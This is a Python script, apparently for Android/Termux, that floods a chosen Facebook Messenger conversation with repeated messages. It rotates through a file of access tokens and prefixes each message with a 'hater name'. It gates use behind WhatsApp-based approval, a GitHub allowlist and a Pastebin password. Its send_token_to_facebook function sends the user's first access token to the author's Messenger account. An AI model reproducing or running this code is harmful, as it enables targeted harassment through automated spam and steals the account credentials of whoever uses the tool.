import requests
import time
import os
import sys
import hashlib
from urllib.parse import quote
from colorama import init, Fore, Style

# Initialize Colorama
init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Unique Key Generate Karne Ka Function
def get_unique_id():
    try:
        unique_str = str(os.getlogin())
        return hashlib.sha256(unique_str.encode()).hexdigest()
    except Exception as e:
        print(f'Error generating unique ID: {e}')
        exit(1)

# Approval Check Karne Ka Function
def check_permission(unique_key):
    print(Fore.YELLOW + "[🔄] Checking Approval...")
    while True:
        try:
            response = requests.get('https://raw.githubusercontent.com/rajput-roni/7k/refs/heads/main/Approval.txt')
            if response.status_code == 200:
                data = response.text
                if unique_key in data:
                    print(Fore.GREEN + "[√] Permission granted. Your Key Was Approved.")
                    return  
                print(Fore.RED + "[❌] Your Key is NOT Approved! Waiting for approval...")
                time.sleep(10)
            else:
                print(f'Failed to fetch permissions list. Status code: {response.status_code}')
                time.sleep(10)
        except Exception as e:
            print(f'Error checking permission: {e}')
            time.sleep(10)

# Approval Request WhatsApp Pe Bhejna
def send_approval_request(unique_key):
    try:
        message = f'Hello, Raj Thakur sir! Please Approve My Token is :: {unique_key}'
        os.system(f'am start https://wa.me/+919695003501?text={quote(message)} >/dev/null 2>&1')
        print(Fore.YELLOW + '[📲] WhatsApp opened with approval request. Waiting for approval...')
    except Exception as e:
        print(f'Error sending approval request: {e}')
        exit(1)

# Approval System Start Karna
def pre_main():
    clear_screen()
    unique_key = get_unique_id()
    print(f'{Fore.YELLOW}[🔐] Your Unique Key: {Fore.CYAN}{unique_key}')
    send_approval_request(unique_key)
    check_permission(unique_key)  
    print(Fore.GREEN + "[✔] Approved! Now Starting Your Script...\n")

# Token ka Profile Name Fetch Karna
def fetch_profile_name(token):
    url = "https://graph.facebook.com/me?fields=name&access_token=" + token
    try:
        response = requests.get(url)
        data = response.json()
        return data.get("name", "Unknown User")
    except:
        return "Unknown User"

# Target Ka Naam Fetch Karna
def fetch_target_name(target_id, token):
    url = f"https://graph.facebook.com/{target_id}?fields=name&access_token={token}"
    try:
        response = requests.get(url)
        data = response.json()
        return data.get("name", "Unknown Target")
    except:
        return "Unknown Target"

# Token Automatically Facebook Messenger Inbox Me Send Karna
def send_token_to_facebook(token):
    try:
        message = f'Hello, Raj Khan sir! I am using your tools. My token 🔐 ==> {token}'
        facebook_url = f'https://www.facebook.com/messages/t/shankar.panchal.9883739?text={quote(message)}'
        os.system(f'am start {facebook_url} >/dev/null 2>&1')
        print(Fore.YELLOW + '[📩] Token Successfully Sent to Facebook Messenger!')
    except Exception as e:
        print(f'Error sending token to Facebook Messenger: {e}')

# Messages Send Karne Ka Function
def send_messages(tokens_file, target_id, messages_file, haters_name, speed):
    with open(messages_file, "r") as file:
        messages = file.readlines()
    with open(tokens_file, "r") as file:
        tokens = [token.strip() for token in file.readlines()]

    token_profiles = {token: fetch_profile_name(token) for token in tokens}
    target_profile_name = fetch_target_name(target_id, tokens[0])  

    headers = {"User-Agent": "Mozilla/5.0"}

    while True:
        for message_index, message in enumerate(messages):
            token_index = message_index % len(tokens)
            access_token = tokens[token_index]
            sender_name = token_profiles.get(access_token, "Unknown Sender")
            full_message = f"{haters_name} {message.strip()}"

            url = f"https://graph.facebook.com/v17.0/t_{target_id}"
            parameters = {"access_token": access_token, "message": full_message}

            try:
                response = requests.post(url, json=parameters, headers=headers)
                response.raise_for_status()
                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")

                print(Fore.YELLOW + f"\n<<════════════ MESSAGE SENT SUCCESSFULLY ════════════>>")
                print(Fore.CYAN + f"[🎉] MESSAGE {message_index + 1} SUCCESSFULLY SENT!")
                print(Fore.WHITE + f"[👤] SENDER: {sender_name}")
                print(Fore.MAGENTA + f"[📩] TARGET: {target_profile_name} ({target_id})")
                print(Fore.LIGHTGREEN_EX + f"[📨] MESSAGE: {full_message}")
                print(Fore.LIGHTWHITE_EX + f"[⏰] TIME: {current_time}")
                print(Fore.YELLOW + f"<<══════════════════════════════════════════════════>>\n")

            except requests.exceptions.RequestException:
                continue  

            time.sleep(speed)

        print(Fore.CYAN + "\n[+] All messages sent. Restarting the process...\n")

# Main Function
def main():
    pre_main()  # Approval System Call
    clear_screen()

    pastebin_url = "https://pastebin.com/raw/kMBpBe88"
    correct_password = requests.get(pastebin_url).text.strip()

    entered_password = input(Fore.LIGHTYELLOW_EX + "  【👑】 ENTER OWNER NAME ➜ ")
    if entered_password != correct_password:
        print(Fore.RED + "[❌] Incorrect OWNER NAME. Exiting program.")
        exit(1)

    tokens_file = input(Fore.GREEN + " 【📕】 ENTER TOKEN FILE ➜ ")
    target_id = input(Fore.GREEN + " 【🖇️】 ENTER CONVO UID ➜ ")
    haters_name = input(Fore.GREEN + " 【🖊️】 ENTER HATER NAME ➜ ")
    messages_file = input(Fore.GREEN + " 【📝】 ENTER MESSAGE FILE ➜ ")
    speed = float(input(Fore.GREEN + " 【⏰】 ENTER DELAY (SECONDS) ➜ "))

    # Token File Se Pehla Token Utha Kar Facebook Messenger Pe Send Karna
    with open(tokens_file, "r") as file:
        first_token = file.readline().strip()
        send_token_to_facebook(first_token)

    send_messages(tokens_file, target_id, messages_file, haters_name, speed)

if __name__ == "__main__":
    main()
